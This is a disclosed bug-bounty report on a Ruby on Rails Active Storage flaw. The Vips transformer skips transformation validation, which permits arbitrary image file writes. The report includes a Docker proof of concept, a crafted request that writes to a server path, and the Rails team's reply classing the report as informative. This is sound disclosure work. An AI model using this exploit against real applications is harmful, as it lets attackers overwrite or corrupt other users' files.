---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/ruby
  - vuln/command-injection
  - vuln/idor
  - vuln/misconfiguration
  - impact/rce
substate: "informative"
weakness: "Path Traversal"
enriched: true
body: true
date: 2026-07-30
submitted: 2026-02-13T09:42:24.457Z
bounty_usd: null
votes: 30
cve: "CVE-2025-24293"
program: "[[programs/rails|Ruby on Rails]]"
reporter: "friedchicken112211"
source: "https://hackerone.com/reports/3553340"
title: "Active Storage Vips Transformer Missing validate_transformation — CVE-2025-24293 Incomplete Fix"
---
# Active Storage Vips Transformer Missing validate_transformation — CVE-2025-24293 Incomplete Fix

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 30 | **Program:** Ruby on Rails | **Disclosed:** 2026-07-30

- Report: [https://hackerone.com/reports/3553340](https://hackerone.com/reports/3553340)
- CWE: Path Traversal | CVE: CVE-2025-24293
- Submitted: 2026-02-13T09:42:24.457Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

The Active Storage Vips Transformer (`activestorage/lib/active_storage/transformers/vips.rb`) does not override `validate_transformation()`. The ImageMagick transformer (`image_magick.rb`) was hardened in the CVE-2025-24293 fix (August 2025) with a method allowlist and argument denylist, but the Vips transformer — **the default variant processor since Rails 7.0** (`config.load_defaults "7.0"` sets `active_storage.variant_processor = :vips` in `railties/lib/rails/application/configuration.rb:256`) — inherits only the base class implementation, which permits any transformation name except `combine_options`.

This allows an attacker to pass dangerous operations like `write_to_file` through the `image_processing` gem's pipeline, resulting in arbitrary image file write to attacker-controlled paths on the server.

## Steps To Reproduce

**1. Verify the code gap (no Docker needed):**

Compare the two transformer files in `activestorage/lib/active_storage/transformers/`:

- `image_magick.rb` — overrides `validate_transformation` with allowlist (`ActiveStorage.supported_image_processing_methods`) + denylist (`ActiveStorage.unsupported_image_processing_arguments`)
- `vips.rb` — does NOT override `validate_transformation`. The entire file is:

```ruby
# frozen_string_literal: true

module ActiveStorage
  module Transformers
    class Vips < ImageProcessingTransformer
      private
        def processor
          ImageProcessing::Vips
        end
    end
  end
end
```

The base class `ImageProcessingTransformer#validate_transformation` only rejects `combine_options`:

```ruby
def validate_transformation(name, argument)
  if name.to_s == "combine_options"
    raise ArgumentError, <<~ERROR.squish
      Active Storage's ImageProcessing transformer doesn't support :combine_options,
      as it always generates a single command.
    ERROR
  end
end
```

**2. Reproduce the file write (Docker PoC):**

Create two files:

**Dockerfile:**
```dockerfile
FROM ruby:3.3-slim
RUN apt-get update && apt-get install -y build-essential libvips-dev && rm -rf /var/lib/apt/lists/*
RUN gem install image_processing ruby-vips
WORKDIR /app
COPY poc.rb .
CMD ["ruby", "poc.rb"]
```

**poc.rb:**
```ruby
require 'image_processing/vips'

# Create a test image
img = Vips::Image.black(100, 100)
img.write_to_file("/tmp/source.png")

# Simulate the Rails pipeline with a malicious write_to_file operation.
# In a real Rails app: blob.variant(write_to_file: "/tmp/pwned.png")
# The image_processing gem forwards unknown operations to Vips::Image via public_send.
pipeline = ImageProcessing::Vips
  .source("/tmp/source.png")
  .convert("png")
  .write_to_file("/tmp/pwned.png")

begin
  pipeline.call
rescue => e
  puts "Pipeline error (expected): #{e.class}"
end

if File.exist?("/tmp/pwned.png")
  puts "VULNERABLE: /tmp/pwned.png created (#{File.size("/tmp/pwned.png")} bytes)"
  puts "write_to_file was forwarded to Vips::Image via public_send"
else
  puts "Not vulnerable"
end
```

Build and run:
```bash
docker build -t f140-poc . && docker run --rm f140-poc
```

The file write occurs as a **side effect** before the pipeline error. In a Rails application, the vulnerable pattern is:
```ruby
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
With request: `GET /images/variant?t=write_to_file&v=/app/public/uploads/evil.png`

**3. Execution Flow:**

1. `blob.variant({write_to_file: "/tmp/pwned.png"})` — Hash input bypasses `Variation.decode` signing
2. `validate_transformation(:write_to_file, "/tmp/pwned.png")` — Vips base class: `name != "combine_options"` → **passes**
3. `Chainable#apply` → `method_missing(:write_to_file)` → records as pipeline operation
4. `Processor#apply_operation` → `respond_to?(:write_to_file)` is false → falls through to `@accumulator.public_send(:write_to_file, "/tmp/pwned.png")`
5. `Vips::Image#write_to_file("/tmp/pwned.png")` executes → **file created**

**4. Confirm Vips is the default processor since Rails 7.0:**

In `railties/lib/rails/application/configuration.rb`, the `load_defaults "7.0"` block sets:
```ruby
active_storage.variant_processor = :vips
```

## Relationship to CVE-2025-24293

CVE-2025-24293 added `validate_transformation` with method allowlist + argument denylist to the **ImageMagick** transformer only. The **Vips** transformer was never patched. The advisory explicitly scopes the fix to "mini_magick as the image processor."

| Transformer | `validate_transformation` override | Protected by CVE-2025-24293 fix |
|---|---|---|
| ImageMagick (`image_magick.rb`) | ✅ Allowlist + denylist | ✅ Yes |
| Vips (`vips.rb`) | ❌ Inherits NOOP base class | ❌ No |

## Suggested Fix

Override `validate_transformation` in the Vips transformer with the same allowlist/denylist model as ImageMagick, or move the validation into the base class `ImageProcessingTransformer` to protect all processors uniformly.

## Impact

**Arbitrary image file write**: An attacker can write processed image data to any server path with a recognized image extension (.png, .jpg, .webp, etc.) by passing `write_to_file` as a variant parameter. This enables:

- **Image defacement / IDOR**: Overwrite another user's uploaded avatar or image file with attacker-controlled image content
- **Asset corruption**: Overwrite application image assets in `public/` directories (logos, favicons)
- **Disk space exhaustion**: Create arbitrarily many large image files

**Limitations** (for transparency):
- Written content is always image data — the attacker **cannot** write arbitrary content (no scripts, configs, or HTML)
- Non-image extensions cause `Vips::Error` and no file is created
- This is NOT RCE (unlike CVE-2025-24293's MiniMagick CLI injection which enabled command execution)
- Exploitation requires the application to pass user-controlled input to `blob.variant()` as a Hash (same prerequisite as CVE-2025-24293)

**Source override** (secondary vector): `source: "/path/to/other_image.jpg"` overrides the pipeline input, potentially disclosing other users' uploaded images. Limited to valid image files.

**Affected versions**: All Rails 7.0+ applications using default configuration (Vips). Rails 5.2+ with explicit `variant_processor = :vips`.

## Timeline

- **Report Filed**
- **2026-02-13** @flavorjones: Thanks for your report. The technical observation is accurate — the Vips transformer does not override `validate_transformation` with the same allowlist/denylist that the ImageMagick transformer uses.

However, the Rails security team has established that the image processing method allowlist is a defense-in-depth measure, not a security boundary. Passing user-supplied transformation methods or parameters to `blob.variant()` is explicitly documented as unsafe:

https://edgeguides.rubyonrails.org/active_storage_overview.html#transforming-images

As a result, reports related to gaps or bypasses in the allowlist are treated as functional issues rather than security vulnerabilities. The standard access path for variants uses signed URLs (`ActiveStorage.verifier`), which prevent an attacker from injecting arbitrary transformation parameters.

We'd encourage filing this as a functional improvement on the public Rails issue tracker (https://github.com/rails/rails/issues) — moving the validation into the base class for consistency across all processors would be a worthwhile enhancement.
- **Report Informative**
- **Agreed On Going Public**
- **Manually Disclosed**
